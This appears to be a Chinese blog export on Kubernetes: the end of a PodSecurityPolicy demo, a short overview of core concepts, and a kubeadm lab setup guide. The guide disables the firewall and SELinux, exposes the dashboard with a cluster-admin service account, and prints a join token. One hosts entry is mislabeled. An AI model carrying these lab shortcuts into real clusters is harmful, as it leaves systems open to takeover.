<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> kubectl-admin=&#x27;kubectl -n psp-<span class="built_in">example</span>&#x27;</span><br><span class="line"><span class="built_in">alias</span> kubectl-user=&#x27;kubectl --as=<span class="built_in">system</span>:serviceaccount:psp-<span class="built_in">example</span>:fake-user -n psp-<span class="built_in">example</span>&#x27;</span><br></pre></td></tr></table></figure>

<p>example-psp.yaml:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">policy/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PodSecurityPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">example</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">privileged:</span> <span class="literal">false</span>  <span class="comment"># Don&#x27;t allow privileged pods!</span></span><br><span class="line">  <span class="comment"># The rest fills in some required fields.</span></span><br><span class="line">  <span class="attr">seLinux:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="attr">supplementalGroups:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="attr">runAsUser:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="attr">fsGroup:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用 kubectl 执行创建操作：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">kubectl-<span class="keyword">admin</span> <span class="keyword">create</span> -f example-psp.yaml</span><br></pre></td></tr></table></figure>

<p>现在，作为一个非特权用户，尝试创建一个简单的 Pod：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">kubectl-user</span> <span class="string">create</span> <span class="string">-f-</span> <span class="string">&lt;&lt;EOF</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pause</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">pause</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">k8s.gcr.io/pause</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Error </span>from server (Forbidden): error when creating &quot;STDIN&quot;: pods &quot;pause&quot; is forbidden: PodSecurityPolicy: unable to admit pod: []</span><br></pre></td></tr></table></figure>

<p> 尽管 PodSecurityPolicy 被创建，Pod 的服务账号或者 <code>fake-user</code> 用户都没有使用该策略的权限。</p>
<h2 id="9-参考"><a href="#9-参考" class="headerlink" title="9. 参考"></a>9. 参考</h2><p><a href="https://kubernetes.io/">https://kubernetes.io/</a></p>
<p>《云原生攻防实践与体系构建》</p>
]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>k8s基本概念</title>
    <url>/Kubernetes%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
    <content><![CDATA[<blockquote>
<p>天下皆知美之为美，斯恶已；皆知善之为善，斯不善已。</p>
</blockquote>
<p>掌握k8s基本概念</p>
<span id="more"></span>

<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>我们都经常使用docker，docker是对容器的封装。它极大的简化了系统的的构建和维护。使得 <code>Docker</code> 技术比虚拟机技术更为轻便、快捷。从而让容器技术应用越来越广泛。</p>
<p>当容器变多了的时候，我们需要同一管理容器的平台，Kubernetes应运而生，Kubernetes是使用最为广泛的容器编排平台。</p>
<h2 id="2-k8s架构"><a href="#2-k8s架构" class="headerlink" title="2. k8s架构"></a>2. k8s架构</h2><p><img src="../images/pic/k8s1.png"></p>
<p><strong>Node：</strong></p>
<p>我们可以把每个宿主机看成一个节点，每个节点又数个pod构成，pod由有一个或多个容器构成。</p>
<p><strong>Master节点：</strong></p>
<p>master节点是负责管理其他节点的主节点</p>
<p><strong>pod:</strong></p>
<p>一个pod相当于运行的一个应用或者服务</p>
<p><strong>API Server:</strong></p>
<p>通过API Server接口可以对集群进行管理</p>
<p><strong>kubelet:</strong></p>
<p>每个节点都装有kubelet，它负责管理自己节点的Pod，同时，Master节点也是通过控制其他节点的kubelet来对其他节点的Pod进行管理。</p>
<p><strong>etcd：</strong></p>
<p>所有master的持续状态都存在etcd的一个实例中。这可以很好地存储配置数据。</p>
<h2 id="3-k8s设计理念"><a href="#3-k8s设计理念" class="headerlink" title="3. k8s设计理念"></a>3. k8s设计理念</h2><p>k8s集群都是通过API的方式进行通讯，这也是分布式系统的设计理念。API都是遵循Restful API接口规范。</p>
]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>k8s环境构建</title>
    <url>/Kubernetes%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<blockquote>
<p>不尚贤，使民不争；不贵难得之货，使民不为盗；不见可欲，使民心不乱。是以圣人之治。</p>
</blockquote>
<p>k8s环境搭建</p>
<span id="more"></span>

<h2 id="1-下载CentOS镜像"><a href="#1-下载CentOS镜像" class="headerlink" title="1. 下载CentOS镜像"></a>1. 下载CentOS镜像</h2><ul>
<li>访问：<a href="https://mirrors.ustc.edu.cn/">https://mirrors.ustc.edu.cn/</a></li>
<li>点击右侧获取安装镜像，选择centos7 x86_64 Minimal</li>
<li>vmware安装镜像</li>
</ul>
<p>按照初始环境搭建安装三个虚拟机</p>
<ul>
<li><p>环境要求</p>
<ul>
<li>每台机器 2 GB 或更多的 RAM</li>
<li>2 CPU 核或更多（master节点即可）</li>
<li>集群中的所有机器的网络彼此均能相互连接</li>
<li>节点之中不可以有重复的主机名、MAC 地址或 product_uuid</li>
</ul>
</li>
<li><p>三台虚拟机都修改hostname</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">hostnamectl</span> <span class="built_in">set-hostname</span> <span class="string">master</span></span><br><span class="line"><span class="string">hostnamectl</span> <span class="built_in">set-hostname</span> <span class="string">node1</span></span><br><span class="line"><span class="string">hostnamectl</span> <span class="built_in">set-hostname</span> <span class="string">node2</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-配置网络"><a href="#2-配置网络" class="headerlink" title="2. 配置网络"></a>2. 配置网络</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/etc/</span>sysconfig/network-scripts</span><br><span class="line">vi ifcfg-ens33</span><br><span class="line">修改BOOTPROTO，IPADDR，GATEWAY，NETMASK，DNS1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens33</span><br><span class="line">UUID=25284585-f1d6-48b6-a9c4-63513d265442</span><br><span class="line">DEVICE=ens33</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=172.16.42.100</span><br><span class="line">GATEWAY=172.16.42.2</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">DNS1=8.8.8.8</span><br></pre></td></tr></table></figure>



<p>systemctl restart network</p>
<p>三个虚拟机都要配置网络设置不同的IP。</p>
<p>三台机器都关闭防火墙</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">systemctl <span class="keyword">stop</span> firewalld; systemctl <span class="keyword">disable</span> firewalld</span><br></pre></td></tr></table></figure>

<p>配置Hosts方便迁移(vi /etc/hosts):</p>
<p>master:</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">172.16.42.101</span> node1</span><br><span class="line"><span class="number">172.16.42.102</span> node2</span><br></pre></td></tr></table></figure>

<p>node1:</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">172.16.42.100</span> master</span><br><span class="line"><span class="number">172.16.42.102</span> node2</span><br></pre></td></tr></table></figure>

<p>node2:</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">172.16.42.100</span> node1</span><br><span class="line"><span class="number">172.16.42.102</span> node2</span><br></pre></td></tr></table></figure>





<h2 id="3-允许-iptables-检查桥接流量"><a href="#3-允许-iptables-检查桥接流量" class="headerlink" title="3. 允许 iptables 检查桥接流量"></a>3. 允许 iptables 检查桥接流量</h2><p>三个节点都要操作</p>
<ul>
<li><p>内核参数修改</p>
<p>br_netfileter模块用于将桥接流量转发至iptables链，br_netfileter内核需要开启转发</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">modprobe br_netfilter</span></span><br></pre></td></tr></table></figure>

<p>查看是否成功，如果没有成功，结果为空</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">lsmod <span class="string">| grep br_netfilter</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>添加流量桥接转发</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cat</span> &lt;&lt;EOF | tee /etc/sysctl.d/k<span class="number">8</span>s.conf</span><br><span class="line"><span class="attribute">net</span>.bridge.bridge-nf-call-ip<span class="number">6</span>tables = <span class="number">1</span></span><br><span class="line"><span class="attribute">net</span>.bridge.bridge-nf-call-iptables = <span class="number">1</span></span><br><span class="line"><span class="attribute">net</span>.ipv<span class="number">4</span>.ip_forward = <span class="number">1</span></span><br><span class="line"><span class="attribute">EOF</span></span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sysctl -p <span class="regexp">/etc/</span>sysctl.d/k8s.conf</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="4-关闭swap交换分区"><a href="#4-关闭swap交换分区" class="headerlink" title="4. 关闭swap交换分区"></a>4. 关闭swap交换分区</h2><ul>
<li><p>临时关闭</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">swapoff -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure></li>
<li><p>关闭完后查看是否为0</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">free -m</span><br></pre></td></tr></table></figure></li>
<li><p>永久关闭</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>fstab</span><br></pre></td></tr></table></figure>

<p>注释掉swap行</p>
<p><img src="../images/pic/k8s3.png" alt="image-20210521103244184"></p>
</li>
</ul>
<p><strong>注：</strong></p>
<ul>
<li>在云平台中用不到swap分区，因为没有空间就会报警</li>
</ul>
<h2 id="5-修改docker文件驱动"><a href="#5-修改docker文件驱动" class="headerlink" title="5. 修改docker文件驱动"></a>5. 修改docker文件驱动</h2><ul>
<li><p>介绍</p>
<ul>
<li>kubelet默认文件驱动为system，docker默认文件驱动为cgroupfs。</li>
<li>当linux的init系统发展到system之后，system 与 cgroups发生了融合（systemd提供了cgroups的使用和管道接口）</li>
</ul>
</li>
<li><p>修改docker的daemon.json</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir <span class="regexp">/etc/</span>docker</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF | sudo tee <span class="regexp">/etc/</span>docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;exec-opts&quot;</span>: [<span class="string">&quot;native.cgroupdriver=systemd&quot;</span>],</span><br><span class="line">  <span class="string">&quot;log-driver&quot;</span>: <span class="string">&quot;json-file&quot;</span>,</span><br><span class="line">  <span class="string">&quot;log-opts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;max-size&quot;</span>: <span class="string">&quot;100m&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;storage-driver&quot;</span>: <span class="string">&quot;overlay2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="6-配置终端代理"><a href="#6-配置终端代理" class="headerlink" title="6. 配置终端代理"></a>6. 配置终端代理</h2><p>vi ~/.bash_profile</p>
<p>ip为宿主机vmware网卡IP，端口为宿主机代理端口</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#终端设置代理</span></span><br><span class="line"></span><br><span class="line">function proxysockes_on()&#123;</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">http_proxy</span>=socks5://172.16.42.1:1086</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">https_proxy</span>=socks5://172.16.42.1:1086</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">all_proxy</span>=socks5://172.16.42.1:1086</span><br><span class="line">	echo <span class="string">&#x27;**************开启当前终端socks5代理**************&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function proxyhttp_on()&#123;</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">http_proxy</span>=http://172.16.42.1:1087</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">https_proxy</span>=http://172.16.42.1:1087</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">all_proxy</span>=http://172.16.42.1:1087</span><br><span class="line">	echo <span class="string">&#x27;*************开启当前终端http代理**************&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function proxy_off()&#123;</span><br><span class="line">	#移除代理</span><br><span class="line">	unset http_proxy</span><br><span class="line">	unset https_proxy</span><br><span class="line">	unset all_proxy</span><br><span class="line">	echo <span class="string">&#x27;************关闭当前终端代理***********&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>起用配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure></li>
<li><p>开启socks代理</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxysockes_on</span></span><br></pre></td></tr></table></figure></li>
<li><p>开启http代理</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxyhttp_on</span></span><br></pre></td></tr></table></figure></li>
<li><p>关闭代理</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxy_off</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>==下面的一系列操作如果无法访问外网下载请开启代理再尝试==</p>
<h2 id="7-配置docker-system代理"><a href="#7-配置docker-system代理" class="headerlink" title="7. 配置docker system代理"></a>7. 配置docker system代理</h2><p>ip为宿主机vmware网卡IP，端口为宿主机代理端口</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir -p <span class="regexp">/etc/</span>systemd<span class="regexp">/system/</span>docker.service.d</span><br><span class="line"></span><br><span class="line">vi <span class="regexp">/etc/</span>systemd<span class="regexp">/system/</span>docker.service.d/proxy.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Environment</span>=<span class="string">&quot;HTTP_PROXY=socks5://172.16.42.1:1086/&quot;</span></span><br><span class="line"><span class="attr">Environment</span>=<span class="string">&quot;HTTPS_PROXY=socks5://172.16.42.1:1086/&quot;</span></span><br><span class="line"><span class="attr">Environment</span>=<span class="string">&quot;NO_PROXY=localhost,127.0.0.1,.example.com&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">systemctl daemon-reload</span></span><br><span class="line"><span class="attribute">systemctl restart docker</span></span><br></pre></td></tr></table></figure>



<h2 id="8-关闭selinux"><a href="#8-关闭selinux" class="headerlink" title="8. 关闭selinux"></a>8. 关闭selinux</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">setenforce <span class="number">0</span></span><br><span class="line">sed -i <span class="string">&#x27;s/^SELINUX=enforcing$/SELINUX=permissive/&#x27;</span> <span class="regexp">/etc/</span>selinux/config</span><br></pre></td></tr></table></figure>

<p>重启 reboot</p>
<h2 id="9-安装kubeadm"><a href="#9-安装kubeadm" class="headerlink" title="9. 安装kubeadm"></a>9. 安装kubeadm</h2><p><u>三台节点虚拟机都要安装</u></p>
<ul>
<li><p>写入kubernetes配置</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF | tee <span class="regexp">/etc/yum</span>.repos.d/kubernetes.repo</span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes</span><br><span class="line">baseurl=https:<span class="regexp">//</span>packages.cloud.google.com<span class="regexp">/yum/</span>repos/kubernetes-el7-\<span class="variable">$basearch</span></span><br><span class="line">enabled=<span class="number">1</span></span><br><span class="line">gpgcheck=<span class="number">1</span></span><br><span class="line">repo_gpgcheck=<span class="number">1</span></span><br><span class="line">gpgkey=https:<span class="regexp">//</span>packages.cloud.google.com<span class="regexp">/yum/</span>doc<span class="regexp">/yum-key.gpg https:/</span><span class="regexp">/packages.cloud.google.com/yum</span><span class="regexp">/doc/</span>rpm-package-key.gpg</span><br><span class="line">exclude=kubelet kubeadm kubectl</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></li>
<li><p>安装kubelet kubeadm kubectl</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">yum install -y kubelet kubeadm kubectl <span class="attribute">--disableexcludes</span>=kubernetes</span><br></pre></td></tr></table></figure></li>
<li><p>开机启动kubelet</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">systemctl <span class="keyword">enable</span> <span class="comment">--now kubelet</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="10-master节点初始化"><a href="#10-master节点初始化" class="headerlink" title="10. master节点初始化"></a>10. master节点初始化</h2><figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">kubeadm</span> <span class="string">init</span> \</span><br><span class="line"><span class="built_in">--apiserver-advertise-address</span> <span class="string">172</span>.<span class="string">16</span>.<span class="string">42</span>.<span class="string">100</span> \</span><br><span class="line"><span class="built_in">--pod-network-cidr</span> <span class="string">&quot;10.220.0.0/16&quot;</span></span><br></pre></td></tr></table></figure>

<p>安装完后会有提示执行如下操作</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">sudo cp -i <span class="regexp">/etc/</span>kubernetes<span class="regexp">/admin.conf $HOME/</span>.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) <span class="variable">$HOME</span><span class="regexp">/.kube/</span>config</span><br></pre></td></tr></table></figure>



<p>安装完成后会有加入节点的命令，也可以通过如下命令查看</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">kubeadm <span class="built_in">token</span> <span class="keyword">create</span> --<span class="keyword">print</span>-join-command</span><br></pre></td></tr></table></figure>





<h2 id="11-node节点加入"><a href="#11-node节点加入" class="headerlink" title="11. node节点加入"></a>11. node节点加入</h2><p>node节点执行join命令</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">kubeadm join <span class="number">172.16</span>.<span class="number">42.100</span>:<span class="number">6443</span> --token dyteek.<span class="number">4</span>tugaul<span class="number">382</span><span class="keyword">c</span><span class="number">7</span>sgsb \</span><br><span class="line">	--discovery-token-ca-cert-hash sha<span class="number">256</span>:<span class="number">7e243</span>bc<span class="number">69</span><span class="keyword">c</span><span class="number">1465069</span><span class="keyword">c</span><span class="number">54</span>fd<span class="number">05</span>d<span class="number">7</span><span class="keyword">c</span><span class="number">09</span><span class="keyword">c</span><span class="number">16</span>d<span class="number">7150</span>b<span class="number">09</span>be<span class="number">2598</span>b<span class="number">34</span>f<span class="number">7</span>fae<span class="number">9</span>d<span class="number">60</span>ebc<span class="number">68</span>f</span><br></pre></td></tr></table></figure>

<p>master通过kubectl get nodes命令查看加入的节点，这时候还是not ready的状态，需要我们安装网络插件</p>
<h2 id="12-master节点安装网络插件calico"><a href="#12-master节点安装网络插件calico" class="headerlink" title="12. master节点安装网络插件calico"></a>12. master节点安装网络插件calico</h2><ul>
<li><p>下载配置文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>docs.projectcalico.org<span class="regexp">/manifests/</span>calico.yaml</span><br></pre></td></tr></table></figure></li>
<li><p>修改calico.yaml的CALICO_IPV4POOL_CIDR 的 value 为 10.220.0.0/16（初始化时配置的地址）</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">FELIX_WIREGUARDMTU</span></span><br><span class="line">  <span class="attr">valueFrom:</span></span><br><span class="line">    <span class="attr">configMapKeyRef:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">calico-config</span></span><br><span class="line">      <span class="attr">key:</span> <span class="string">veth_mtu</span></span><br><span class="line"><span class="comment"># The default IPv4 pool to create on startup if none exists. Pod IPs will be</span></span><br><span class="line"><span class="comment"># chosen from this range. Changing this value after installation will have</span></span><br><span class="line"><span class="comment"># no effect. This should fall within `--cluster-cidr`.</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">CALICO_IPV4POOL_CIDR</span></span><br><span class="line">  <span class="attr">value:</span> <span class="string">&quot;10.220.0.0/16&quot;</span></span><br><span class="line"><span class="comment"># Disable file logging so `kubectl logs` works.</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">CALICO_DISABLE_FILE_LOGGING</span></span><br><span class="line">  <span class="attr">value:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure></li>
<li><p>应用配置</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">apply</span> -f calico.yaml</span><br></pre></td></tr></table></figure></li>
</ul>
<p>查看节点状态：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">kubectl <span class="builtin-name">get</span> nodes</span><br></pre></td></tr></table></figure>

<p><img src="../images/pic/k8s4.jpg"> </p>
<p>查看pod:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">kubectl <span class="builtin-name">get</span> pods -A</span><br></pre></td></tr></table></figure>

<p><img src="../images/pic/k8s5.jpg"></p>
<h2 id="13-master节点安装dashboard插件"><a href="#13-master节点安装dashboard插件" class="headerlink" title="13. master节点安装dashboard插件"></a>13. master节点安装dashboard插件</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/kubernetes/</span>dashboard<span class="regexp">/v2.0.0/</span>aio<span class="regexp">/deploy/</span>recommended.yaml</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>添加nodePort 和 type</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">8443</span></span><br><span class="line">      <span class="attr">nodePort:</span> <span class="number">30000</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<p>追加管理配置</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">dashboard-admin</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">dashboard-admin</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">dashboard-admin</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cluster-admin</span></span><br></pre></td></tr></table></figure>

<p>应用插件</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">apply</span> -f recommended.yaml</span><br></pre></td></tr></table></figure>



<p>查看生成的dashboard配置</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">kubectl <span class="builtin-name">get</span> pods -A</span><br></pre></td></tr></table></figure>

<p>生成token</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kubectl describe secrets -n kubernetes-dashboard dashboard-admin</span></span><br></pre></td></tr></table></figure>

<p>查看映射端口</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">kubectl</span> <span class="meta">get</span> <span class="keyword">svc</span> -n kubernetes-dashboard</span><br></pre></td></tr></table></figure>

<p>查看ip地址：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kubectl describe pod kubernetes-dashboard-xxxxx -n kubernetes-dashboard</span></span><br></pre></td></tr></table></figure>

<p>通过ip和端口确定访问的地址：<a href="https://172.16.42.102:30000/">https://172.16.42.102:30000/</a></p>
<p>填入token访问</p>
<p>访问chrome可能有问题，用火狐。</p>
<h2 id="14-用kubeadm重置集群"><a href="#14-用kubeadm重置集群" class="headerlink" title="14. 用kubeadm重置集群"></a>14. 用kubeadm重置集群</h2><p>如果出错我们可以重置，从新安装</p>
<p>master节点</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">kubeadm reset</span><br><span class="line">rm -rf <span class="regexp">/etc/</span>cni/net.d</span><br><span class="line">rm -rf <span class="variable">$HOME</span><span class="regexp">/.kube/</span>config</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kubeadm init \</span><br><span class="line">--apiserver-advertise-address <span class="number">10.21</span>.<span class="number">55.100</span> \</span><br><span class="line">--pod-network-cidr <span class="string">&quot;10.220.0.0/16&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">sudo cp -i <span class="regexp">/etc/</span>kubernetes<span class="regexp">/admin.conf $HOME/</span>.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) <span class="variable">$HOME</span><span class="regexp">/.kube/</span>config</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kubectl apply -f calico.yaml</span><br><span class="line"></span><br><span class="line">kubectl apply -f recommended.yaml</span><br></pre></td></tr></table></figure>



<h2 id="15-创建一个pod"><a href="#15-创建一个pod" class="headerlink" title="15. 创建一个pod"></a>15. 创建一个pod</h2><p>vim nginx.yaml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-demo</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-deomo</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br></pre></td></tr></table></figure>

